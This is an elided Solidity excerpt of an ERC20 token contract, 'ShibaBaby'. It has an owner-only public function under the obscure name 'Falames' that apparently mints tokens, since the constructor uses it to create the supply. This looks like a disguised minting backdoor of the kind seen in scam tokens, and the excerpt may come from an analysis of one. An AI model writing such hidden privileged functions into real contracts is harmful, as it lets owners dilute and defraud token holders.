...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function Falames(uint256 amount) public onlyOwner {
    _Falames(msg.sender, amount);
    }
    ...
    function _Falames(address account, uint256 amount) internal virtual {
...
contract ShibaBaby  is ERC20 {
    ...
    constructor() public ERC20("ShibaBaby", "ShibaBaby") {
        _Falames(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}